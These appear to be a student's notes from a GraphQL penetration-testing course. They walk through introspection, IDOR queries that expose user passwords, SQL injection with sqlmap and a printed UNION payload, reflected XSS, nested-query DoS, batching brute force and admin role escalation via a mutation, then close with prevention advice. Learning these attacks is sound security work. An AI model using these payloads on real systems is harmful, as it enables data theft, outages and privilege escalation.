# Attacking GraphQL module

This module covers common misconfigurations and security vulnerabilities that arise in GraphQL APIs.

In more detail, this module covers the following:

- Enumerating GraphQL APIs
- Information Disclosure in GraphQL APIs
- IDOR Vulnerabilities in GraphQL APIs
- Injection Vulnerabilities in GraphQL APIs
- DoS & Brute-Force Vulnerabilities in GraphQL APIs
- Common Misconfigurations in GraphQL APIs

- https://graphql.org/learn/introduction/

## **Introduction to GraphQL**

GraphQL is a query language typically used by web APIs as an alternative to 
REST. It enables the client to fetch required data through a simple syntax while providing a wide variety of features typically provided by query languages, such as SQL. Like REST APIs, GraphQL APIs can read, update, create, or delete data. However, GraphQL APIs are typically implemented on a single endpoint that handles all queries. As such, one of the primary benefits of using GraphQL over traditional REST APIs is the efficiency in resource utilization and request handling.
****

### Basic Overview

From an abstract point of view, GraphQL queries select `fields` of objects. Each object is of a specific `type` defined by the backend. The query is structured according to GraphQL syntax, with the name of the `query` to run at the root. For instance, we can query the `id`, `username`, and `role` fields of all `User` objects by running the `users` query:

```graphql
{
  users {
    id
    username
    role
  }
}
```

The resulting GraphQL response is structured in the same way and might look something like this:

```graphql
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```

If a query supports arguments, we can add a supported argument to filter the query results. For instance, if the query `users` supports the `username` argument, we can query a specific user by supplying their username:

```graphql
{
  users(username: "admin") {
    id
    username
    role
  }
}
```

We can add or remove fields from the query we are interested in. For instance, if we are not interested in the `role` field and instead want to obtain the user's password, we can adjust the query accordingly:

```graphql
{
  users(username: "admin") {
    id
    username
    password
  }
}
```

Furthermore, GraphQL queries support sub-querying, which enables a query to retrieve details from an object that references another object. For instance, assume that a `posts` query returns a field `author` that holds a user object. We can then query the username and role of the `author` in our query like so:

```graphql
{
  posts {
    title
    author {
      username
      role
    }
  }
}
```

The result contains the `title` of all posts as well as the queried data of the corresponding author:

```graphql
{
  "data": {
    "posts": [
      {
        "title": "Hello World!",
        "author": {
          "username": "htb-stdnt",
          "role": "user"
        }
      },
      {
        "title": "Test",
        "author": {
          "username": "test",
          "role": "user"
        }
      }
    ]
  }
}
```

GraphQL queries support much more complex operations. However, this introductory overview is sufficient for the purposes of this module. For more details, check out the [Learn](https://graphql.org/learn/) section on the official GraphQL website.

### The Core Differences

**1. The Data Fetching Method**

- **REST (Representational State Transfer):** Relies on multiple "endpoints" (URLs). If you want user info and their posts, you might have to call two different URLs.
- **GraphQL:** Uses a single endpoint. You send a "query" to that one URL, specifying all the data you need in one go.
    
    +1
    

**2. Over-fetching vs. Under-fetching**

- **REST** often suffers from **over-fetching**. If an endpoint gives you a user's full profile but you only need their username, you’re stuck downloading data you don't need.
- **GraphQL** solves this. You request the `username` field specifically, and that is all the server sends back.

**3. Versioning**

- **REST:** When you make big changes, you often have to create a new version (e.g., `api.com/v1/` and `api.com/v2/`).
- **GraphQL:** It's "versionless." You can add new fields without breaking old queries, and deprecate old fields gracefully.

### 1. Coding a REST API with Flask

In REST, you define a specific function for every unique URL path.

```python
from flask import Flask, jsonify

app = Flask(__name__)

# Mock Database
users = {1: {"name": "Gemini", "email": "ai@google.com"}}
posts = {101: {"title": "Python is Fun", "author_id": 1}}

@app.route('/post/<int:post_id>', methods=['GET'])
def get_post(post_id):
    # This endpoint ONLY returns post data
    post = posts.get(post_id)
    return jsonify(post)

@app.route('/user/<int:user_id>', methods=['GET'])
def get_user(user_id):
    # This endpoint ONLY returns user data
    user = users.get(user_id)
    return jsonify(user)

if __name__ == '__main__':
    app.run(debug=True)
```

**The Workflow:** To get a post and its author, the client must call `/post/101`, get the `author_id`, and then call `/user/1`.

---

### 2. Coding a GraphQL API with Graphene

In GraphQL, you define a "Schema" (a map of your data) and a single route. The client then tells the server what parts of that map it wants.

```python
from flask import Flask
from flask_graphql import GraphQLView
import graphene

# 1. Define the Data Shapes (Types)
class UserType(graphene.ObjectType):
    name = graphene.String()
    email = graphene.String()

class PostType(graphene.ObjectType):
    title = graphene.String()
    author = graphene.Field(UserType)

    def resolve_author(parent, info):
        # Logic to link post to user
        return {"name": "Gemini", "email": "ai@google.com"}

# 2. Define the Query (The Entry Point)
class Query(graphene.ObjectType):
    post = graphene.Field(PostType, id=graphene.Int())

    def resolve_post(root, info, id):
        return {"title": "Python is Fun"}

schema = graphene.Schema(query=Query)

# 3. Setup the Flask App with ONE endpoint
app = Flask(__name__)
app.add_url_rule(
    '/graphql', 
    view_func=GraphQLView.as_view('graphql', schema=schema, graphiql=True)
)

if __name__ == '__main__':
    app.run(debug=True)
```

**The Workflow:** The client sends a POST request to `/graphql` with a body like `{ post(id: 101) { title author { name } } }`. The server handles the nesting automatically.

## Attacking GraphQL

### Information Disclosure

Exploiting any service requires thorough enumeration and reconnaissance to identify all possible attack vectors. As attackers, we aim to obtain as much information about a service as possible.

---

1. **Identifying the GraphQL Engine**

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/1.png)

if we clicked on one of the posts a GET request will be sent to the server `GET /post?id=1` 

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/2.png)

Here in the JS script of the `post frond-end source code` the id parameter will be set based on the requested post id, in our case, it is set to `1` then it will send a POST request to the `/graphql` containing this query ``{post(id: ${id}) { id title body category author { username }}}`

```jsx
<script>
        var id = 1;
	

		var results_table_body = document.querySelector('#resultsBody');
		fetch('/graphql', {
  			method: 'POST',
  			headers: { 'Content-Type': 'application/json' },
  			body: JSON.stringify({query : `{post(id: ${id}) { id title body category author { username }}}`}) 

		}
		)
        .then(res => res.json())
  		.then(json => {
            document.querySelector('#title').innerHTML = json.data.post.title;
            document.querySelector('#author').innerHTML = `By: ${json.data.post.author.username}`;
            document.querySelector('#body').innerHTML = json.data.post.body;
	})
  .catch(console.error);
  

</script>
```

Response: 

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/3.png)

Note the post(id =1) is the arguemnt of the i

To  identify the GraphQL engine used by the web application we can use graphw00f tool. Graphw00f will send various GraphQL queries, including malformed queries, and can determine the GraphQL engine by observing the backend's behavior and error messages in response to these queries.

```bash
$ python3 main.py --target=http://154.57.164.64:30152/ -f -d 

   ...
[*] Checking http://154.57.164.64:30152/
[*] Checking http://154.57.164.64:30152//
[*] Checking http://154.57.164.64:30152//api
[*] Checking http://154.57.164.64:30152//graphql
[!] Found GraphQL at http://154.57.164.64:30152//graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md                                 
[!] Technologies: Python                                                     
[!] Homepage: https://graphene-python.org                                    
[*] Completed.     
```

Visit the attack surface at → https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md for Graphene engine

> **Security Considerations:** graphene provides the following features which should be taken into consideration:
> 
> 
> 
> | Field Suggestions | Query Depth Limit | Query Cost Analysis | Automatic Persisted Queries | Introspection | Debug Mode | Batch Requests |
> | --- | --- | --- | --- | --- | --- | --- |
> | ✅Enabled by Default | ❌No Support | ❌No Support | ❌No Support | ✅Enabled by Default | ❌No Support | ⚠️Disabled by Default |

Lastly, by accessing the `/graphql` endpoint in a web browser directly, we can see that the web application runs a graphiql interface. This enables us to provide GraphQL queries directly, which 
is a lot more convenient than running the queries through Burp, as we do not need to worry about breaking the JSON syntax.

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/4.png)

---

1. Introspection

Introspection is a GraphQL feature that enables users to query the GraphQL API about 
the structure of the backend system. As such, users can use introspection queries to obtain all queries supported by the API schema. These introspection queries query the `__schema` field.

For instance, we can identify all GraphQL types supported by the backend using the following query:

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

The results contain basic default types, such as `Int` or `Boolean`, but also all custom types, such as `UserObject`:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/5.png)

Next, we can obtain all the queries supported by the backend using this query:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/6.png)

Knowing all supported queries helps us identify potential attack vectors that we can use to obtain sensitive information.

Now that we know a type, we can follow up and obtain the name of all of the type's fields with the following introspection query:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

In the result, we can see details we would expect from a user object, such as `username` and `password`, as well as their data types:

```bash
{
  "data": {
    "__type": {
      "name": "UserObject",
      "fields": [
        {
          "name": "uuid",
          "type": {
            "name": null,
            "kind": "NON_NULL"
          }
        },
        {
          "name": "id",
          "type": {
            "name": null,
            "kind": "NON_NULL"
          }
        },
        {
          "name": "username",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        },
        {
          "name": "password",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        },
        {
          "name": "role",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        },
        {
          "name": "msg",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        },
        {
          "name": "posts",
          "type": {
            "name": "PostObjectConnection",
            "kind": "OBJECT"
          }
        }
      ]
    }
  }
}
```

to view all the information stored in this type, use this query: 

```graphql
{
  users{
    id
    uuid
    username
    password
    msg
    posts{
      pageInfo {
        startCursor
        endCursor
      }
      edges {
        node {
          id
        }
      }
    }
  }

}
```

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/7.png)

Lastly, we can use the following "general" introspection query that dumps all information about types, fields, and queries supported by the backend:

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/8.png)

The result of this query is quite large and complex. However, we can visualize the schema using the tool GraphQL-Voyager. For this module, we will use the GraphQL Demo. However, in a real engagement, we should follow the GitHub instructions to host the tool ourselves, ensuring that no sensitive information leaves our system. In the demo, we can click `CHANGE SCHEMA` and select `INTROSPECTION`. After pasting the result of the above introspection query in the text field and clicking on `DISPLAY`, the backend's GraphQL schema is visualized for us. We can explore all supported queries, types, and fields:
![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/9.png)


Based on the introspection result, the field `secrets` returns a list of `SecretObject`. Since `secrets` returns a `SecretObject` (which is an `OBJECT` kind), you cannot just ask for `secrets`. You must specify which sub-fields inside the `SecretObject` you want to see. If you don't know what fields are available inside `SecretObject`, you can run a targeted introspection query just for that specific type:

```graphql
{
  __type(name: "SecretObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

The secrets and the users fields was guessed based on the ta

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/10.png)

Then we can query the data inside the `secrets` object by specifying its fields: 

```graphql
{
  secrets{
    id
    secret
  }
}
```

- **Note: There is a difference between the `introspection Query` and `Data Query`:**
    - The first query (`__type`) is an **Introspection Query**. You are asking the server *What is a `UserObject`? What fields does it have?*
    - The second query (`users { ... }`) is a **Data Query**. Here, you are actually asking the server to look into the database and bring back real information.
    
    Earlier, we found a field named `secrets` that returns `SecretObject`. To get that data just like we did for `users`, you would follow the same logic:
    
    1. **Check the Blueprint:**GraphQL
        
        ```graphql
        {
          __type(name: "SecretObject") {
            fields { name }
          }
        }
        ```
        
    2. **Fetch the Data:**GraphQL
        
        ```graphql
        {
          secrets {
            # Put the field names you found in step 1 here
            id
            secret 
          }
        }
        ```
        
    
    **Quick Tip:** In a professional environment, many developers use a tool called **GraphiQL** or **Apollo Studio**. These tools have an "Explorer" sidebar that lets you click on field names to build these queries automatically without typing them out!
    

### **Insecure Direct Object Reference (IDOR)**

**1. Identifying IDOR**

To identify issues related to broken authorization, we first need to identify potential attack points that would enable us to access data we are not authorized to access. Enumerating the web application, we can observe that the following GraphQL query is sent when we access our user profile:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/11.png)

As we can see, user data is queried for the username provided in the query. While the web application automatically queries the data for the user we logged in with, we should check if we can access other users' data. To do so, let us provide a different username we know exists: `admin`. Note that we need to escape the double quotes inside the GraphQL query so as not to break the JSON syntax:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/12.png)

As we can see, we can query the user `admin`'s data without any additional authorization checks. Thus, we successfully confirmed a lack of authorization checks in this GraphQL query.

---

1. **Exploiting IDOR**

To demonstrate the impact of this IDOR vulnerability, we need to identify the data that can be accessed without authorization. To do so, we are going to use the following **introspection queries** to determine all fields of the `User` type:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

paste these inside the query field

```graphql
{"query":"{__type(name: \"UserObject\") {name fields {name type {name kind}}}}"}
```

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/13.png)

Now that we know the fields used by the Data Query we can edjest our query to view all the users informations or view a specifc user

```graphql
{"query":"{user(username: \"admin\") {id uuid username password role msg}}"}
```

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/14.png)

To view all users:

```graphql
{"query":"{users {id uuid username password role msg}}"}
```

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/15.png)

---

### Injection Attacks

---

1. **SQL Injection**

Using the introspection query discussed earlier and some trial-and-error, we can identify that the backend supports the following queries that require arguments:

- `post`
- `user`
- `postByAuthor`

To identify if a query requires an argument, we can send the query without any arguments and analyze the response. If the backend expects an argument, the response contains an error that tells us the name of the required argument. For instance, the following error message tells us that the `postByAuthor` query requires the `author` argument:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/16.png)

After supplying the `author` argument, the query is executed successfully:

```graphql
{"query":"{postByAuthor(author: \"admin\"){id title}}"}
```

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/17.png)

We can now investigate whether the `author` argument is vulnerable to SQL injection. For instance, if we try a basic SQL injection payload, the query does not return any result:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/18.png)

Let us move on to the `user` query. If we try the same payload there, the query still returns the previous result, indicating a SQL injection vulnerability:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/19.png)

If we simply inject a single quote, the response contains a SQL error, confirming the vulnerability:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/20.png)

Since the SQL query is displayed in the SQL error, we can construct a UNION-based SQL injection query to exfiltrate data from the SQL database. **Remember that the database may contain data that cannot be queried through the GraphQL API**. As such, we should check for any sensitive data in the database that we can access. To construct a UNION-based SQL injection payload, let  us take another look at the results of the introspection query:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/21.png)

The vulnerable `user` query returns a `UserObject`, so let us focus on that object. As we can see, the object consists of **six fields** and a link (`posts`). The fields correspond to columns in the database table. As such, our UNION-based SQL injection payload needs to contain six columns to match the number of columns in the original query. Furthermore, the fields we specify in our GraphQL query correspond to the columns returned in the response. For instance, since the `username` is a `UserObject's` third field, querying for the `username` will result in the third column of our UNION-based payload being reflected in the response.

For the exploitation im gonna use `sqlmap` to automate the attack and dump the database. I first created a text file containing the request header and body, also note I added an injection marker ('*') to specify where to start the SQL injection 

```bash
$ cat graph_req.txt 
POST /graphql HTTP/1.1
Host: 154.57.164.81:30232
Content-Length: 75
Accept-Language: en-US,en;q=0.9
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://154.57.164.75:30219
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXIiOiJodGItc3RkbnQifQ.aY8OzA.O1PYuleYeXJVFsIFGLpyTOsWQw4
Connection: keep-alive

{"query":"{user(username:\"admin*\"){id uuid username password role msg}}"}
                                                                 
```

Now we can pass it to sqlmap and use `--union-cols` to specify that the required columns are 6

```bash
$ sqlmap -r graph_req.txt --dbs --dump --technique=U --union-cols=6 --dbms=mysql --batch
sqlmap identified the following injection point(s) with a total of 117 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column (custom)
    Payload: {"query":"{user(username:\"-7909' UNION ALL SELECT CONCAT(CONCAT('qpjqq','zpMVEjkkGUYkOHXqneJmCEKAMXuqrpfXwaTFZLdo'),'qbbkq'),NULL,NULL,NULL,NULL,NULL-- OZyM\"){id uuid username password role msg}}"}
---
[16:03:44] [INFO] testing MySQL
[16:03:45] [INFO] confirming MySQL
[16:03:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[16:03:46] [INFO] fetching database names
available databases [2]:
[*] db
[*] information_schema
....

```

the server conatins two database: 

```bash
db  -> custom
information_schema -> default
```

and the `db` database contains these tables:

```bash
secrets
flag
user
posts
```

Here is where the tables saved to

```bash
 ls /home/kali/.local/share/sqlmap/output/154.57.164.81/dump/db/       
flag.csv  post.csv  secret.csv  user.csv
```

---

1. **Cross-Site Scripting (XSS)**

XSS vulnerabilities can occur if GraphQL responses are inserted into the HTML page without proper sanitization. Similar to the above SQL injection vulnerability, we should investigate any GraphQL arguments for potential XSS injection points. However, in this case, neither queries 
return an XSS payload:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/22.png)

XSS vulnerabilities can also occur if invalid arguments are reflected in error messages. Let us examine the `post` query, which requires an integer ID as an argument. If we instead 
submit a string argument containing an XSS payload, we can see that the XSS payload is reflected without proper encoding in the GraphQL error message:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/23.png)

However, if we attempt to trigger the URL from the corresponding GET parameter by accessing the URL `/post?id=<script>alert(1)</script>`, we can observe that the page simply breaks, and the XSS payload is not triggered.

### Denial of Service

**1.Denial-of-Service (DoS) via Recursive Loops**

GraphQL allows for deeply nested queries. If your schema has circular relationships (e.g., a **User** has **Posts**, and each **Post** has an **Author/User**), an attacker can exploit this "infinite loop."

- **The Mechanism:** An attacker constructs a "Circular Query" that bounces back and forth between objects.
- **The Impact:** Because each level of nesting multiplies the data retrieved, the response size grows **exponentially**.
- **The Result:** This consumes massive CPU and memory on the backend, potentially crashing the server or making it unavailable to legitimate users.

To execute a DoS attack, we must identify a way to construct a query that results in a large response. Let's look at the visualization of the introspection results in `GraphQL Voyager`. We can identify a loop between the `UserObject` and `PostObject` via the `author` and `posts` fields:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/24.png)

We can abuse this loop by constructing a query that queries the author of all posts. For each author, we then query the author of all posts again. If we repeat this many times, the result grows 
exponentially larger, potentially resulting in a DoS scenario. 

Since the `posts` object is a `connection`, we need to specify the `edges` and `node` fields to obtain a reference to the corresponding `Post`object. As an example, let us query the author of all posts. From there, we will query all posts by each author and then the author's 
username for each of these posts:

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

This is an infinite loop we can repeat as many times as we want. If we take a look at the result of this query, it is already quite large because the response grows exponentially larger with each iteration of the loop we query:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/25.png)

Making our initial query large will significantly slow down the server, potentially causing availability issues for other users. For instance, the following query crashes the `GraphiQL` instance:

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      posts {
                        edges {
                          node {
                            author {
                              posts {
                                edges {
                                  node {
                                    author {
                                      posts {
                                        edges {
                                          node {
                                            author {
                                              posts {
                                                edges {
                                                  node {
                                                    author {
                                                      posts {
                                                        edges {
                                                          node {
                                                            author {
                                                              posts {
                                                                edges {
                                                                  node {
                                                                    author {
                                                                      username
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/26.png)

---

---

**2. Batching Attacks**

Batching is a feature that allows a client to send multiple queries in a single JSON array (one HTTP request). While efficient for performance, it can be abused to bypass security.

- **The Mechanism:** An attacker packs hundreds or thousands of queries (like login attempts) into one single POST request.
- **The Impact:** Traditional **Rate Limiters** usually count *HTTP requests*, not individual queries.
- **The Result:** * **Brute-Force Bypass:** If a rate limit allows 5 requests per second, an attacker batching 1,000 queries per request can test 5,000 passwords per second instead of 5.
    - **Resource Exhaustion:** Processing a massive batch of unrelated queries simultaneously puts a heavy strain on the database.

For instance, we can query the ID of the user `admin` and the title of the first post in a single request:

```
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```

The response contains the requested information in the same structure we provided the query in:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/27.png)

Batching is not a security vulnerability but an intended feature that can be enabled or disabled.

### **Mutations**

In the `Introduction to GraphQL` section, we discussed various basic elements of GraphQL queries. However, you might have noticed that we only discussed ways to read data. Just like REST APIs, GraphQL also provides a way to modify data: `mutations`.

---

**1.What are mutations?** 

Mutations are GraphQL queries that modify server data. They can be 
used to create new objects, update existing objects, or delete existing objects. Let us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

From the result, we can identify a mutation `registerUser`, presumably allowing us to create new users. The mutation requires a `RegisterUserInput` object as an input:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/28.png)

We can now query all fields of the  `RegisterUserInput` object with the following introspection query to obtain all fields that we can use in the mutation:

```graphql
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

From the result, we can identify that we can provide the new user's `username`, `password`, `role`, and `msg`:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/29.png)

As we identified earlier, we need to provide the password as an MD5 
hash. To hash our password, we can use the following command:

Mutations

```bash
aishaxx@htb[/htb]$ echo -n 'password' | md5sum

5f4dcc3b5aa765d61d8327deb882cf99  -
```

With the hashed password, we can now finally register a new user by running the mutation:

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

The result contains the fields we queried in the mutation's body so that we can check for errors:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/30.png)

We can now successfully log in to the application with our newly registered user.

---

**2. Exploitation with Mutations**

To identify potential attack vectors through mutations, we must thoroughly examine all supported mutations and their corresponding inputs. In this case, we can provide the `role` argument for 
newly registered users, which might enable us to create users with a different role than the default role, potentially allowing us to escalate privileges.

We have identified the roles `user` and `admin` by querying all existing users. Let us create a new user with the role `admin` and check if this enables us to access the internal admin endpoint at `/admin`. We can use the following GraphQL mutation:

```graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

In the result, we can see that the role `admin` is reflected, which indicates that the attack was successful:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/31.png)

After logging in, we can now access the admin endpoint, meaning we have successfully escalated our privileges:

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/32.png)

### Tools of the Trade

We have already discussed tools that can help us in the enumeration phase: graphw00f and graphql-voyager. We will now discuss further tools to help us attack GraphQL APIs.

- the tool GraphQL-Cop, a security audit tool for GraphQL APIs.
- InQL is a Burp extension we can install via the `BApp Store` in Burp. After a successful installation, an `InQL` tab is added in Burp.
    - Furthermore, the extension adds `GraphQL` tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax:
        
        ![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/33.png)
          
        Furthermore, we can right-click on a GraphQL request and select `Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner`:
        
        ![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/34.png)

        
        Afterward, InQL generates introspection information. The information regarding all mutations and queries is provided in the `InQL` tab for the scanned host:
        
        ![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/35.png)

        
        This is only a basic overview of InQL's functionality. Check out the official GitHub repository for more details.
        

### **GraphQL Vulnerability Prevention**

To prevent vulnerabilities in GraphQL, security must be applied across four key layers: visibility, input integrity, resource management, and access control.

**1. Information Disclosure**

- **Disable Introspection:** Turn off introspection queries in production to prevent attackers from mapping your entire schema.
- **Audit the Schema:** If introspection must remain active, manually review it to ensure no sensitive fields (like `password` or `internal_id`) are exposed.
- **Generic Errors:** Suppress verbose stack traces or database errors; return generic messages to the client.

---

**2. Injection & Input Validation**

- **Trust Nothing:** Treat all user-supplied data (arguments and inputs) as untrusted.
- **Sanitize & Validate:** Use strict **allowlists** for input validation to prevent SQLi, NoSQLi, Command Injection, and XSS.
- **Parameterized Queries:** Ensure the backend resolvers use parameterized queries when interacting with databases.

---

**3. Denial-of-Service (DoS) Mitigation**

GraphQL's flexibility allows for "expensive" queries that can crash a server.

- **Query Depth Limiting:** Prevent deeply nested queries (e.g., a user's posts' author's posts...) that cause circular resource exhaustion.
- **Cost Analysis & Size Limits:** Limit the maximum size of a query string and assign "costs" to fields to reject overly complex requests.
- **Disable Batching:** If you don't need to send multiple queries in one request, disable batching to prevent brute-force amplification.
- **Rate Limiting:** Throttle the endpoint to stop automated attacks and rapid-fire queries.

---

**4. API Design & Access Control**

- **Authorization is Mandatory:** Authentication only proves *who* you are; **Authorization** checks must be performed inside every resolver to ensure a user is allowed to see or modify that specific data (preventing IDOR).
- **Principle of Least Privilege:** Users should only have access to the specific queries and mutations required for their role.
- **Authentication First:** Secure the GraphQL endpoint behind a login wall so it is not publicly accessible unless necessary.

For more details on securing GraphQL APIs, check out OWASP's GraphQL Cheat Sheet.

## Skills Assessment

### Scenario

The tech company `Recovera Systems` has commissioned an external penetration test of its backend GraphQL API after taking its public website offline for maintenance in response to a recent security incident. Although the user-facing portion of the platform is temporarily disabled, the underlying GraphQL API remains fully active. The client wants to ensure that no vulnerabilities in its schema design, query handling, or data-exposure logic contributed to the breach or could enable future compromise once the site is restored. Try to apply the techniques learned in this module to identify and assess any vulnerabilities before the company re-enables the website.

### Discovery

![Alt](/HTB/Web_Penetration_Tester/Attacking-graphQL/images/s1.png)

### Introspection Queries

- **GraphQL Types**
    
    ```graphql
    {
      __schema{
        types{
          name
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__schema": {
          "types": [
            {
              "name": "Query"
            },
            {
              "name": "Node"
            },
            {
              "name": "ID"
            },
            {
              "name": "EmployeeObject"
            },
            {
              "name": "String"
            },
            {
              "name": "Int"
            },
            {
              "name": "ProductObject"
            },
            {
              "name": "ApiKeyObject"
            },
            {
              "name": "CustomerObject"
            },
            {
              "name": "Mutation"
            },
            {
              "name": "AddEmployee"
            },
            {
              "name": "AddEmployeeInput"
            },
            {
              "name": "AddProduct"
            },
            {
              "name": "AddProductInput"
            },
            {
              "name": "AddCustomer"
            },
            {
              "name": "AddCustomerInput"
            },
            {
              "name": "__Schema"
            },
            {
              "name": "__Type"
            },
            {
              "name": "__TypeKind"
            },
            {
              "name": "Boolean"
            },
            {
              "name": "__Field"
            },
            {
              "name": "__InputValue"
            },
            {
              "name": "__EnumValue"
            },
            {
              "name": "__Directive"
            },
            {
              "name": "__DirectiveLocation"
            }
          ]
        }
      }
    }
    ```
    

- **GraphQL Queries**
    
    ```graphql
    {
      __schema{
        queryType{
          fields{
            name
            description
          }
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__schema": {
          "queryType": {
            "fields": [
              {
                "name": "node",
                "description": null
              },
              {
                "name": "allEmployees",
                "description": null
              },
              {
                "name": "employeeByUsername",
                "description": null
              },
              {
                "name": "allProducts",
                "description": null
              },
              {
                "name": "productByName",
                "description": null
              },
              {
                "name": "activeApiKeys",
                "description": null
              },
              {
                "name": "allCustomers",
                "description": null
              },
              {
                "name": "customerByName",
                "description": null
              }
            ]
          }
        }
      }
    }
    ```
    

- **Query a specific type**
    
    ```graphql
    {
      __type(name: "ApiKeyObject"){
        name
        fields{
          name
          type{
            name
            kind
          }
        }
      }
